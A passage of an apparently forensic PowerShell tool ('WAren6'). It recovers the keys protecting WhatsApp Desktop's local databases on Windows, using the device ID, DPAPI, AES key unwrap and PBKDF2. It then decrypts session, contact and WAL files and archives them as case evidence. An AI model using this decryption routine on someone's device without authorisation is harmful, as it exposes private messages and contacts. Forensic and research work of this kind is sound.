        $hasCopiedFile = Get-ChildItem -Path $Destination -Recurse -Force -File -ErrorAction SilentlyContinue | Select-Object -First 1
        if (-not $hasCopiedFile) {
            throw "Copy-Directory failed: No files were copied to '$Destination'."
        }
        Write-Verbose "Copy completed."

    }
    catch {
        throw "Error during copy operation: $($_.Exception.Message)"
    }
}

function Test-WAren6FileReadableNoExclusiveLock {
    param(
        [Parameter(Mandatory = $true)][string]$Path
    )

    if (-not (Test-Path -LiteralPath $Path -PathType Leaf)) {
        return $true
    }
    $stream = $null
    try {
        $stream = [System.IO.File]::Open(
            $Path,
            [System.IO.FileMode]::Open,
            [System.IO.FileAccess]::Read,
            [System.IO.FileShare]::ReadWrite
        )
        return $true
    }
    catch {
        return $false
    }
    finally {
        if ($stream) { $stream.Dispose() }
    }
}

function Wait-WAren6DatabaseLockRelease {
    param(
        [Parameter(Mandatory = $true)][string]$RootPath,
        [Parameter(Mandatory = $false)][int]$TimeoutSeconds = 5
    )

    $probeFiles = [System.Collections.Generic.List[string]]::new()
    foreach ($relative in @("session.db", "session.db-wal")) {
        $candidate = Join-Path $RootPath $relative
        if (Test-Path -LiteralPath $candidate -PathType Leaf) {
            $probeFiles.Add($candidate) | Out-Null
        }
    }

    $sessionsRoot = Join-Path $RootPath "sessions"
    if (Test-Path -LiteralPath $sessionsRoot -PathType Container) {
        Get-ChildItem -LiteralPath $sessionsRoot -Directory -ErrorAction SilentlyContinue |
            ForEach-Object {
                foreach ($name in @("nativeSettings.db", "contacts.db", "genericStorage.db")) {
                    $candidate = Join-Path $_.FullName $name
                    if (Test-Path -LiteralPath $candidate -PathType Leaf) {
                        $probeFiles.Add($candidate) | Out-Null
                    }
                    $walCandidate = "$candidate-wal"
                    if (Test-Path -LiteralPath $walCandidate -PathType Leaf) {
                        $probeFiles.Add($walCandidate) | Out-Null
                    }
                }
            }
    }

    if ($probeFiles.Count -eq 0) {
        return $true
    }

    $deadline = (Get-Date).AddSeconds($TimeoutSeconds)
    do {
        $locked = @($probeFiles | Where-Object { -not (Test-WAren6FileReadableNoExclusiveLock -Path $_) })
        if ($locked.Count -eq 0) {
            return $true
        }
        Start-Sleep -Milliseconds 250
    } while ((Get-Date) -lt $deadline)

    Write-Warning "Proceeding after lock wait timeout; backup-mode copy will still attempt preserved acquisition."
    return $false
}


function ConvertTo-HexString {
    param(
        [byte[]]$ByteArray
    )

    if (-not $ByteArray) { return "" } # nul array 

    $hexString = ""
    foreach ($byte in $ByteArray) {
        $hexString += $byte.ToString("x2")
    }
    return $hexString
}

function Get-WAren6BytesSha256Hex {
    param(
        [Parameter(Mandatory = $false)]
        [byte[]]$Bytes
    )

    if (-not $Bytes -or $Bytes.Count -eq 0) { return "" }

    $sha = [System.Security.Cryptography.SHA256]::Create()
    try {
        return [BitConverter]::ToString($sha.ComputeHash($Bytes)).Replace('-', '').ToLowerInvariant()
    }
    finally {
        $sha.Dispose()
    }
}

function Get-WAren6FileSha256Hex {
    param(
        [Parameter(Mandatory = $true)][string]$Path
    )

    $stream = $null
    $sha = [System.Security.Cryptography.SHA256]::Create()
    try {
        $stream = [System.IO.File]::Open(
            $Path,
            [System.IO.FileMode]::Open,
            [System.IO.FileAccess]::Read,
            [System.IO.FileShare]::ReadWrite
        )
        return [BitConverter]::ToString($sha.ComputeHash($stream)).Replace('-', '').ToLowerInvariant()
    }
    finally {
        if ($stream) { $stream.Dispose() }
        $sha.Dispose()
    }
}

function Format-WAren6SecretFingerprint {
    param(
        [Parameter(Mandatory = $false)]
        [byte[]]$Bytes
    )

    $hash = Get-WAren6BytesSha256Hex -Bytes $Bytes
    if (-not $hash) { return "unavailable" }
    return ($hash.Substring(0, [Math]::Min(12, $hash.Length)))
}
function Get-OfflineDeviceUniqueID {
    param(
        [string]$Salt
    )
    enum RETRIEVAL_METHOD {
        ODUID_DEFAULT = 0
        ODUID_TPM_EK
        ODUID_UEFI_VARIABLE_TPM
        ODUID_UEFI_VARIABLE_RANDOMSEED
        ODUID_UEFI_DEV_LOCK_UNLOCK
        ODUID_XBOX_CONSOLE_ID
        ODUID_REGISTRY_ENTRY
    }
    $rm = [RETRIEVAL_METHOD]::ODUID_DEFAULT
    $cbSalt = 0
    $pbSalt = [byte[]]::new(0)

    if ($Salt) {
        if ($Salt.StartsWith("0x") -and ($Salt.Length % 2 -eq 0)) {
            $pbSalt = [byte[]]::new(($Salt.Length - 2) / 2)
            for ($i = 2; $i -lt $Salt.Length; $i += 2) {
                $pbSalt[($i / 2) - 1] = [Convert]::ToByte($Salt.Substring($i, 2), 16)
            }
        }
        else {
            $pbSalt = [System.Text.Encoding]::ASCII.GetBytes($Salt)
        }
        $cbSalt = [System.UInt32]$pbSalt.Length
    }

    $cbSystemId = [System.UInt32]32
    $rgbSystemId = [byte[]]::new(32)

    $res = [ClipcWrapper]::GetOfflineDeviceUniqueID($cbSalt, $pbSalt, ([ref]$rm), ([ref]$cbSystemId), $rgbSystemId, 0, 0) 

    if ($res -lt 0) {
        throw [System.ComponentModel.Win32Exception]::new($res)
    }

    Write-Verbose "Got Offline Device Unique ID"
    $devID = ConvertTo-HexString $rgbSystemId
    Write-Verbose "ID: [redacted; sha256:$(Format-WAren6SecretFingerprint -Bytes $rgbSystemId)]"
    return @{Method = [RETRIEVAL_METHOD]$rm; ID = $rgbSystemId }
}

function Read-Bytes {
    param (
        [string]$filePath,
        [int]$offset,
        [int]$length
    )
    
    $fileStream = [System.IO.File]::OpenRead($filePath)
    $fileStream.Seek($offset, [System.IO.SeekOrigin]::Begin) | Out-Null
    $buffer = New-Object byte[] $length
    $fileStream.Read($buffer, 0, $length) | Out-Null
    $fileStream.Close()
    return $buffer
}

# Function to unwrap AES key using Bouncy Castle
function ConvertFrom-WrappedAesKeyBC {
    param(
        [Parameter(Mandatory = $true)]
        [System.Byte[]]$wrappedKey,
        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
        [System.Byte[]]$kek
    )

    try {
        # Import necessary namespaces 
        $null = [System.Reflection.Assembly]::LoadWithPartialName("BouncyCastle.Crypto") 
        $null = [System.Reflection.Assembly]::LoadWithPartialName("BouncyCastle.Security") 
        # Create the cipher 
        $cipher = [Org.BouncyCastle.Crypto.Engines.AesWrapEngine]::new() 
        $cipher.Init($false, [Org.BouncyCastle.Crypto.Parameters.KeyParameter]::new($kek)) 
        # Unwrap the key 
        $unwrappedKey = $cipher.Unwrap($wrappedKey, 0, $wrappedKey.Length)

        return $unwrappedKey
    }
    catch {
        Write-Error "Error unwrapping key (Bouncy Castle): $($_.Exception.Message)"
        Write-Error $_.Exception | Format-List *
        Write-WAren6Output "Error unwrapping key (Bouncy Castle): $($_.Exception.Message)"
        exit
    }
}

function Unprotect-NativeSettingsSecret {
    param(
        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
        [System.Byte[]]$dpapi_blob,
        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
        [System.Byte[]]$wrapped_key,
        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
        [System.Byte[]]$nonce,
        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
        [System.Byte[]]$cipher_text,
        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
        [System.Byte[]]$gcmTag,
        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
        [System.Byte[]]$passphrase,
        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
        [boolean]$hasPadding
    )
    # Decrypt blob DPAPI with Windows API
    try {
        $kek = [System.Security.Cryptography.ProtectedData]::Unprotect($dpapi_blob, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    }
    catch {
        Write-WAren6Output "Generation of KEK failed - this may occur if the ODUID provided is incorrect"
        exit
    }
    Write-Verbose "kek: [redacted; sha256:$(Format-WAren6SecretFingerprint -Bytes $kek)]"
    
    # Decrypt wrappedKey
    # Unwrap AES key using AesKeyUnwrap
    $gcm_key = ConvertFrom-WrappedAesKeyBC -WrappedKey $wrapped_key -KEK $kek

    Write-Verbose "gcm_key: [redacted; sha256:$(Format-WAren6SecretFingerprint -Bytes $gcm_key)]"
    # Algorithm definition - AES256GCM 
    # Create the cipher 
    try {
        $cipher = [Org.BouncyCastle.Crypto.Engines.AesEngine]::new()
        $gcmBlockCipher = [Org.BouncyCastle.Crypto.Modes.GcmBlockCipher]::new($cipher) 
        $parameters = [Org.BouncyCastle.Crypto.Parameters.AeadParameters]::new([Org.BouncyCastle.Crypto.Parameters.KeyParameter]::new($gcm_key), 128, $nonce) 
        $cipher_text_tagged = $cipher_text + $gcmTag
        # Initialize the cipher for decryption
        $null = $gcmBlockCipher.Init($false, $parameters) 
        # Decrypt the bytes 
        $second_cipher_text = [byte[]]::new($gcmBlockCipher.GetOutputSize($cipher_text_tagged.Length)) 
        $len = $gcmBlockCipher.ProcessBytes($cipher_text_tagged, 0, $cipher_text_tagged.Length, $second_cipher_text, 0) 
        $null = $gcmBlockCipher.DoFinal($second_cipher_text, $len)

        Write-Verbose "Decrypted-BC nsCipherText(padded): [redacted; sha256:$(Format-WAren6SecretFingerprint -Bytes $second_cipher_text)]"
       
        # Generate encryption key (encKey) through PBKDF2
        $digest = [Org.BouncyCastle.Crypto.Digests.Sha256Digest]::new()
        $generator = [Org.BouncyCastle.Crypto.Generators.Pkcs5S2ParametersGenerator]::new($digest) 
        $generator.Init($passphrase, $WhatsAppAppUID, $global:pbkdf_iterations) 
        $keyParameter = $generator.GenerateDerivedMacParameters(256) 
        $encKey = $keyParameter.GetKey()
        Write-Verbose "EncryptionKey-BC (encKey): [redacted; sha256:$(Format-WAren6SecretFingerprint -Bytes $encKey)]"
    
        $generator.Init($encKey, $WhatsAppAppUID, $global:pbkdf_iterations) 
        $keyParameter = $generator.GenerateDerivedMacParameters(128) 
        $IV = $keyParameter.GetKey()
        Write-Verbose "(IV-BC): [redacted; sha256:$(Format-WAren6SecretFingerprint -Bytes $IV)]"
    
        # Create the AES object (.NET implementation is simpler to use than BouncyCastle's one)
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $encKey
        $aes.IV = $IV
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        if ($hasPadding) {
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        }
        else {
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::None    
        }
        # Create a decryptor
        $decryptor = $aes.CreateDecryptor($aes.Key, $aes.IV)

        # Decrypt the data
        $decryptedBytes = $decryptor.TransformFinalBlock($second_cipher_text, 0, $second_cipher_text.Length) 
        $aes.Dispose()
        return [byte[]]$decryptedBytes
    }
    catch {
        Write-WAren6Output "Unable to decrypt the data - $($_.Exception.Message)"
        exit
    }
}

function Get-Key {
    param(
        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
        [string]$FilePath,
        [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
        [byte[]]$UserKey,
        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
        [boolean]$HasPadding
    )
   
    Write-Verbose "--- Extracting key from $FilePath ---"
    $byteArray = [System.IO.File]::ReadAllBytes($FilePath)
    $dpapi_blob_size, $dpapi_blob, $dpapi_hex = Find-Signature $byteArray ([byte[]](0x02, 0x01, 0x04, 0x30)) 0 $false
    Write-Verbose "dpapi_blob_size: $dpapi_blob_size"
    Write-Verbose "dpapi_blob: [redacted; sha256:$(Format-WAren6SecretFingerprint -Bytes $dpapi_blob)]"
    "--- $FilePath ---" | Out-File -FilePath "$targetOutput\$metaDataFileName" -Append
    "dpapi_blob_sha256: $(Get-WAren6BytesSha256Hex -Bytes $dpapi_blob)" | Out-File -FilePath "$targetOutput\$metaDataFileName" -Append

    $wrapped_key_size, $wrapped_key, $wrapped_key_hex = Find-Signature $byteArray ([byte[]](0x04, 0x01, 0x2D, 0x04)) 0 $false
    Write-Verbose "wrapped_key_size: $wrapped_key_size"
    Write-Verbose "wrapped_key: [redacted; sha256:$(Format-WAren6SecretFingerprint -Bytes $wrapped_key)]"
    "wrapped_key_sha256: $(Get-WAren6BytesSha256Hex -Bytes $wrapped_key)" | Out-File -FilePath "$targetOutput\$metaDataFileName" -Append

    $nonce_size, $nonce, $nonce_hex = Find-Signature $byteArray ([byte[]](0x2E, 0x30, 0x11, 0x04)) 0 $false
    Write-Verbose "nonce_size: $nonce_size"
    Write-Verbose "nonce: [redacted; sha256:$(Format-WAren6SecretFingerprint -Bytes $nonce)]"
    "nonce_sha256: $(Get-WAren6BytesSha256Hex -Bytes $nonce)" | Out-File -FilePath "$targetOutput\$metaDataFileName" -Append

    $cipher_text_and_gcm_size, $cipher_text_and_gcm, $cipher_text_and_gcm_hex = Find-Signature $byteArray ([byte[]](0x02, 0x01, 0x10, 0x80)) 0 $false
    $cipher_text_size = $cipher_text_and_gcm_size - 16
    $cipher_text = $cipher_text_and_gcm[0..($cipher_text_size - 1)]
    $cipher_text_hex = $cipher_text_and_gcm_hex.Substring(0, ($cipher_text_size * 2))
    Write-Verbose "cipher_text_size: $cipher_text_size"
    Write-Verbose "cipher_text: [redacted; sha256:$(Format-WAren6SecretFingerprint -Bytes $cipher_text)]"
    "cipher_text_sha256: $(Get-WAren6BytesSha256Hex -Bytes $cipher_text)" | Out-File -FilePath "$targetOutput\$metaDataFileName" -Append

    $gcm_tag = $cipher_text_and_gcm[($cipher_text_and_gcm_size - 16)..$cipher_text_and_gcm_size]
    $gcm_tag_hex = [BitConverter]::ToString($gcm_tag).Replace('-', '')
    Write-Verbose "gcm_tag: [redacted; sha256:$(Format-WAren6SecretFingerprint -Bytes $gcm_tag)]"
    "gcm_tag_sha256: $(Get-WAren6BytesSha256Hex -Bytes $gcm_tag)" | Out-File -FilePath "$targetOutput\$metaDataFileName" -Append
    Write-Verbose "--- End key extraction from $FilePath ---"
    "--- End $FilePath ---" | Out-File -FilePath "$targetOutput\$metaDataFileName" -Append
    if ($PSBoundParameters.ContainsKey('UserKey')) {
        return Unprotect-NativeSettingsSecret $dpapi_blob $wrapped_key $nonce $cipher_text $gcm_tag $UserKey $HasPadding
    }
    else {
        return Unprotect-NativeSettingsSecret $dpapi_blob $wrapped_key $nonce $cipher_text $gcm_tag $whatsappDll_passphrase_bc $HasPadding
    }
}

# Decrypt database page
function Unprotect-DatabasePage ($blockCipher, $keyParameter, $pageNumber, $pageData) {
    $IV = [byte[]]::new(16)
    # Use GetBytes + Array.Copy (Buffer.BlockCopy) - avoids Object[] boxing from [-12..-1]
    $null = [BitConverter]::GetBytes([int]$pageNumber).CopyTo($IV, 0)
    $last12 = [byte[]]::new(12)
    [Buffer]::BlockCopy($pageData, $pageData.Length - 12, $last12, 0, 12)
    [Buffer]::BlockCopy($last12, 0, $IV, 4, 12)

    $cipherParameters = [Org.BouncyCastle.Crypto.Parameters.ParametersWithIV]::new($keyParameter, $IV)

    $null = $blockCipher.Init($true, $cipherParameters)
    # Using BufferedBlockCipher to be able to call ProcessBytes
    $bufferedCipher = [Org.BouncyCastle.Crypto.BufferedBlockCipher]::new($blockCipher)
    # Create buffer
    $decryptedBytes = [byte[]]::new($pageData.Length)
    # Decrypt block bytes
    $null = $bufferedCipher.ProcessBytes($pageData, 0, $pageData.Length, $decryptedBytes, 0)
    $null = $bufferedCipher.DoFinal($decryptedBytes, $bufferedCipher.GetUpdateOutputSize($pageData.Length))
    return $decryptedBytes
}

# Decrypt DB file
function Unprotect-DatabaseFile ($dbKey, $inputFile, $outputFile) {
    $cipher = [Org.BouncyCastle.Crypto.Engines.AesEngine]::new()
    $blockCipher = [Org.BouncyCastle.Crypto.Modes.OfbBlockCipher]::new($cipher, 128)
    $keyParameter = [Org.BouncyCastle.Crypto.Parameters.KeyParameter]::new($dbKey)
    $pageSize = 4096
    $inputBytes = [System.IO.File]::ReadAllBytes($inputFile)
    $inputSize  = $inputBytes.Length

    # Preserve reserved bytes 0x10-0x17 from the encrypted file
    $copiedBytes = [byte[]]::new(8)
    [Buffer]::BlockCopy($inputBytes, 0x10, $copiedBytes, 0, 8)

    $fileStream = $null
    try {
        $fileStream = [System.IO.File]::OpenWrite($outputFile)
        $pageData = [byte[]]::new($pageSize)

        for ($i = 0; $i + $pageSize -le $inputSize; $i += $pageSize) {
            [Buffer]::BlockCopy($inputBytes, $i, $pageData, 0, $pageSize)
            $decryptedPage = Unprotect-DatabasePage $blockCipher $keyParameter ([int]($i / $pageSize) + 1) $pageData
            $null = $fileStream.Write($decryptedPage, 0, $decryptedPage.Length)
        }

        # Restore reserved bytes 0x10-0x17
        $null = $fileStream.Seek(0x10, [System.IO.SeekOrigin]::Begin)
        $null = $fileStream.Write($copiedBytes, 0, $copiedBytes.Length)
        $null = $fileStream.Close()
        $fileStream = $null

        # Verify output while preserving the encrypted acquisition file.
        $outSize = (Get-Item $outputFile).Length
        if ($outSize -eq $inputSize) {
            Write-Verbose "DB decrypted OK; preserved encrypted input: $inputFile"
        } else {
            Write-Warning "DB output size mismatch ($outSize vs $inputSize) for '$outputFile' - keeping original"
        }
    } catch {
        Write-Warning "Error in Unprotect-DatabaseFile: $($_.Exception.Message)"
        throw
    } finally {
        if ($null -ne $fileStream) { $null = $fileStream.Close() }
    }

    Write-Verbose "DB file successfully decrypted: $outputFile"
}

function Unprotect-DatabaseWalFile ($dbKey, $inputFile, $outputFile) {
    $cipher         = [Org.BouncyCastle.Crypto.Engines.AesEngine]::new()
    $blockCipher    = [Org.BouncyCastle.Crypto.Modes.OfbBlockCipher]::new($cipher, 128)
    $keyParameter   = [Org.BouncyCastle.Crypto.Parameters.KeyParameter]::new($dbKey)
    $pageSize       = 4096
    $headerSize     = 32
    $pageHeaderSize = 24
    $frameSize      = $pageSize + $pageHeaderSize

    $inputBytes = [System.IO.File]::ReadAllBytes($inputFile)
    $inputSize  = $inputBytes.Length
    $totalFrames = [Math]::Floor(($inputSize - $headerSize) / $frameSize)

    Write-Verbose "WAL frames to decrypt: $totalFrames  (input=$inputSize bytes)"

    # Pre-allocate reusable typed byte[] buffers - avoids Object[] boxing from '..' operator
    $pageHeaderData = [byte[]]::new($pageHeaderSize)
    $pageData       = [byte[]]::new($pageSize)
    $pageIndexBuf   = [byte[]]::new(4)

    $fileStream = $null
    try {
        $fileStream = [System.IO.File]::OpenWrite($outputFile)

        # Write WAL header as-is
        $fileStream.Write($inputBytes, 0, $headerSize)

        for ($f = 0; $f -lt $totalFrames; $f++) {
            $frameStart = $headerSize + $f * $frameSize

            # Use Buffer::BlockCopy for typed byte[] - never creates Object[]
            [Buffer]::BlockCopy($inputBytes, $frameStart,                   $pageHeaderData, 0, $pageHeaderSize)
            [Buffer]::BlockCopy($inputBytes, $frameStart + $pageHeaderSize, $pageData,       0, $pageSize)

            # Extract page number (big-endian in frame header bytes 0-3)
            [Buffer]::BlockCopy($pageHeaderData, 0, $pageIndexBuf, 0, 4)
            [Array]::Reverse($pageIndexBuf)
            $pageNum = [System.BitConverter]::ToInt32($pageIndexBuf, 0)

            Write-Verbose "Frame $f : pageNum=$pageNum"

            $decryptedPage = Unprotect-DatabasePage $blockCipher $keyParameter $pageNum $pageData
            $fileStream.Write($pageHeaderData, 0, $pageHeaderData.Length)
            $fileStream.Write($decryptedPage,  0, $decryptedPage.Length)
        }

        $fileStream.Close()
        $fileStream = $null

        # Validate output size while preserving the encrypted WAL as evidence.
        $outSize = (Get-Item $outputFile).Length
        if ($outSize -eq $inputSize) {
            Write-Verbose "WAL decrypted OK ($totalFrames frames), encrypted input preserved: $outputFile"
        } else {
            Write-Warning "WAL output size mismatch ($outSize vs $inputSize) for '$(Split-Path $outputFile -Leaf)' - keeping original encrypted file"
        }
    } catch {
        Write-Warning "Error in Unprotect-DatabaseWalFile for '$(Split-Path $inputFile -Leaf)': $($_.Exception.Message)"
        throw
    } finally {
        if ($null -ne $fileStream) { $null = $fileStream.Close() }
    }
}

# Decrypt all files in current directory 
function Unprotect-AllDatabaseFiles ($dbKey, $targetDirectory) { 
    Get-ChildItem -Path $targetDirectory -Filter "*.dec.*" -Force | Remove-Item -Force
    $dbFiles = Get-ChildItem -Path $targetDirectory -Filter *.db 
    $walFiles = Get-ChildItem -Path $targetDirectory -Filter *.db-wal 
    $files = @() #empty array
    if ($dbFiles) { $files += $dbFiles } 
    if ($walFiles) { $files += $walFiles } 
    foreach ($file in $files) { 
        if ($file.Extension -eq ".db" -or $file.Extension -eq ".db-wal") { 
            $outputFile = [System.IO.Path]::ChangeExtension($file.FullName, ".dec" + $file.Extension) 
            if (-not (Test-Path $outputFile)) { 
                try {
                    if ($file.Extension -eq ".db") {
                        Write-WAren6Output "Decrypting DB: $file"
                        Unprotect-DatabaseFile $dbKey $file.FullName $outputFile
                    }
                    else {
                        if ($file.Extension -eq ".db-wal") {
                            Write-WAren6Output "Decrypting DB-WAL: $file"
                            Unprotect-DatabaseWalFile $dbKey $file.FullName $outputFile
                        }
                    }
                }
                catch {
                    if ($_.Exception.Message -like "*Source array was not long enough*") {
                        Write-WAren6Output "Error decrypting $file - File is $($file.Length) bytes."
                    }
                    else {
                        Write-WAren6Output "Error decrypting $file - $($_.Exception.Message)"
                    }
                }
            } 
        } 
    } 
}
# Function to compress the content of a directory to a zip file and delete the source directory.
function Compress-Directory {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Source,

        [Parameter(Mandatory = $true)]
        [string]$DestinationZipFile,

        [Parameter(Mandatory = $false)]
        [switch]$DeleteSource
    )

    try {
        # Check if the source directory exists
        if (!(Test-Path -Path $Source -PathType Container)) {
            throw "Source directory '$Source' not found."
        }

        # Remove the destination zip file if it already exists
        if (Test-Path -Path $DestinationZipFile) {
            Remove-Item -Path $DestinationZipFile -Force -ErrorAction SilentlyContinue
        }

        # Get the content of the source directory
        $sourceContent = Get-ChildItem -Path $Source

        # Compress the content of the directory
        Compress-Archive -Path $sourceContent.FullName -DestinationPath $DestinationZipFile -Force

        if ($DeleteSource) {
            Remove-Item -Path $Source -Force -Recurse -ErrorAction SilentlyContinue
            Write-Verbose "Content of directory '$Source' compressed to '$DestinationZipFile' and deleted successfully."
        }
        else {
            Write-Verbose "Content of directory '$Source' compressed to '$DestinationZipFile'. Source preserved."
        }

    }
    catch {
        Write-Error "Error during compression operation: $($_.Exception.Message)"
    }
}

function Get-SHA256Checksum {
    param(
        [Parameter(Mandatory = $true)]
        [string]$FilePath,
        [Parameter(Mandatory = $false)]
        [string]$Sha256Hash
    )

    try {
        if (!(Test-Path -Path $FilePath -PathType Leaf)) {
            throw "File '$FilePath' not found."
        }

        $hashValue = if ([string]::IsNullOrWhiteSpace($Sha256Hash)) {
            Get-WAren6FileSha256Hex -Path $FilePath
        }
        else {
            $Sha256Hash
        }
        if ($FilePath -like "*.zip") {
            $outputFilePath = $FilePath -replace "\.zip$", ".sha256.txt"
        }
        else {
            $outputFilePath = $FilePath + ".sha256.txt"
        }
        "$hashValue  $(Split-Path -Path $FilePath -Leaf)" | Out-File -FilePath $outputFilePath -Encoding UTF8
        return $outputFilePath
    }
    catch {
        Write-Error "Error generating SHA256 checksum for '$FilePath': $($_.Exception.Message)"
        return $null
    }
}

$script:WAren6TelegramCloudLimitBytes = 52428800
$script:WAren6TelegramPartSizeBytes = 50331648

function Test-WAren6TarZstdAvailable {
    try {
        Get-Command "tar.exe" -ErrorAction Stop | Out-Null
        $version = & tar.exe --version 2>&1
        if ($LASTEXITCODE -eq 0 -and $version -match "zstd") {
            return $true
        }
        & tar.exe --zstd --version 2>&1 | Out-Null
        return ($LASTEXITCODE -eq 0)
    }
    catch {
        return $false
    }
}

function Test-WAren6ArchiveReadable {
    param(
        [Parameter(Mandatory = $true)]
        [string]$ArchivePath
    )

    if (-not (Test-Path -LiteralPath $ArchivePath -PathType Leaf)) {
        return $false
    }
    $item = Get-Item -LiteralPath $ArchivePath
    if ($item.Length -le 0) {
        return $false
    }

    try {
        if ($ArchivePath -like "*.zip") {
            Add-Type -AssemblyName System.IO.Compression.FileSystem
            $zip = [System.IO.Compression.ZipFile]::OpenRead($ArchivePath)
            try {
                return ($zip.Entries.Count -gt 0)
            }
            finally {
                $zip.Dispose()
            }
        }

        $listing = & tar.exe -tf $ArchivePath 2>&1
        return ($LASTEXITCODE -eq 0 -and $listing.Count -gt 0)
    }
    catch {
        return $false
    }
}

function New-WAren6CaseArchive {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Source,
        [Parameter(Mandatory = $true)]
        [string]$OutputDirectory,
        [Parameter(Mandatory = $true)]
        [string]$BaseName,
        [Parameter(Mandatory = $false)]
        [switch]$DeleteSource
    )

    if (-not (Test-Path -LiteralPath $Source -PathType Container)) {
        throw "Source directory '$Source' not found."
    }
    New-Item -ItemType Directory -Force -Path $OutputDirectory | Out-Null

    if (Test-WAren6TarZstdAvailable) {
        $archivePath = Join-Path $OutputDirectory "$BaseName.tar.zst"
        if (Test-Path -LiteralPath $archivePath) {
            Remove-Item -LiteralPath $archivePath -Force
        }
        $sourceItem = Get-Item -LiteralPath $Source
        $sourceParent = Split-Path -Path $sourceItem.FullName -Parent
        $sourceLeaf = Split-Path -Path $sourceItem.FullName -Leaf
        $tarOutput = & tar.exe --zstd -cf $archivePath -C $sourceParent $sourceLeaf 2>&1
        foreach ($line in $tarOutput) {
            if ($line) { Write-WAren6Output $line }
        }
        if ($LASTEXITCODE -ne 0) {
            throw "tar.exe failed to create zstd archive (exit code $LASTEXITCODE)."
        }
        $format = "tar.zst"
    }
    else {
        $archivePath = Join-Path $OutputDirectory "$BaseName.zip"
        if (Test-Path -LiteralPath $archivePath) {
            Remove-Item -LiteralPath $archivePath -Force
        }
        $sourceContent = Get-ChildItem -LiteralPath $Source -Force
        if (-not $sourceContent) {
            throw "Source directory '$Source' is empty."
        }
        Compress-Archive -Path $sourceContent.FullName -DestinationPath $archivePath -Force
        $format = "zip"
    }

    if (-not (Test-WAren6ArchiveReadable -ArchivePath $archivePath)) {
        throw "Archive verification failed for '$archivePath'."
    }

    if ($DeleteSource) {
        Remove-Item -LiteralPath $Source -Force -Recurse -ErrorAction SilentlyContinue
    }

    return [PSCustomObject]@{
        Path = $archivePath
        Format = $format
        Size = (Get-Item -LiteralPath $archivePath).Length
        Sha256 = Get-WAren6FileSha256Hex -Path $archivePath
    }
}

function Remove-WAren6CaseDirectoryAfterArchive {
    param(
        [Parameter(Mandatory = $true)]
        [string]$CasePath,
        [Parameter(Mandatory = $true)]
        [string]$ArchivePath
    )

    if (-not (Test-Path -LiteralPath $CasePath -PathType Container)) {
        return $false
    }
    if (-not (Test-Path -LiteralPath $ArchivePath -PathType Leaf)) {
        Write-Warning "Keeping case folder because archive was not found."
        return $false
    }
    if (-not (Test-WAren6ArchiveReadable -ArchivePath $ArchivePath)) {
        Write-Warning "Keeping case folder because archive verification failed."
        return $false
    }

    $leaf = Split-Path -Path $CasePath -Leaf
    if ($leaf -notmatch '^WAren6_\d{14}$') {
        Write-Warning "Keeping case folder because '$leaf' does not look like a WAren6 case folder."
        return $false
    }

    try {
        Remove-Item -LiteralPath $CasePath -Force -Recurse -ErrorAction Stop
        return $true
    }
    catch {
        Write-Warning "Unable to remove extracted case folder: $($_.Exception.Message)"
        return $false
    }
}

function Protect-WAren6FileAesCbcHmac {
    param(
        [Parameter(Mandatory = $true)]
        [string]$InputPath,
        [Parameter(Mandatory = $true)]
        [string]$OutputPath,
        [Parameter(Mandatory = $true)]
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '', Justification = 'Compatibility with -enc CLI; caller redacts and does not write this value to manifests.')]
        [string]$Password
    )

    if (-not (Test-Path -LiteralPath $InputPath -PathType Leaf)) {
        throw "Encryption input not found: $InputPath"
    }

    $salt = New-Object byte[] 16
    $iv = New-Object byte[] 16
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    try {
        $rng.GetBytes($salt)
        $rng.GetBytes($iv)
    }
    finally {
        $rng.Dispose()
    }
    $iterations = 200000
    $kdf = [System.Security.Cryptography.Rfc2898DeriveBytes]::new(
        $Password,
        $salt,
        $iterations,
        [System.Security.Cryptography.HashAlgorithmName]::SHA256
    )
    $keyMaterial = $kdf.GetBytes(64)
    $aesKey = New-Object byte[] 32
    $macKey = New-Object byte[] 32
    [Array]::Copy($keyMaterial, 0, $aesKey, 0, 32)
    [Array]::Copy($keyMaterial, 32, $macKey, 0, 32)

    $inputItem = Get-Item -LiteralPath $InputPath
    $header = [ordered]@{
        schema = "waren6.transfer.encrypted.v1"
        algorithm = "AES-256-CBC+HMAC-SHA256"
        kdf = "PBKDF2-HMAC-SHA256"
        iterations = $iterations
        salt_b64 = [Convert]::ToBase64String($salt)
        iv_b64 = [Convert]::ToBase64String($iv)
        plaintext_name = $inputItem.Name
        plaintext_size = $inputItem.Length
        plaintext_sha256 = Get-WAren6FileSha256Hex -Path $InputPath
    }
    $headerJson = ($header | ConvertTo-Json -Depth 6 -Compress)
    $headerBytes = [System.Text.Encoding]::UTF8.GetBytes($headerJson)
    $headerLengthBytes = [BitConverter]::GetBytes([int32]$headerBytes.Length)
    $magicBytes = [System.Text.Encoding]::ASCII.GetBytes("WA6ENC1`n")
    $tempPath = "$OutputPath.tmp"

    $inStream = $null
    $outStream = $null
    $cryptoStream = $null
    $aes = $null
    try {
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.KeySize = 256
        $aes.BlockSize = 128
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.Key = $aesKey
        $aes.IV = $iv

        $outStream = [System.IO.File]::Open($tempPath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
        $outStream.Write($magicBytes, 0, $magicBytes.Length)
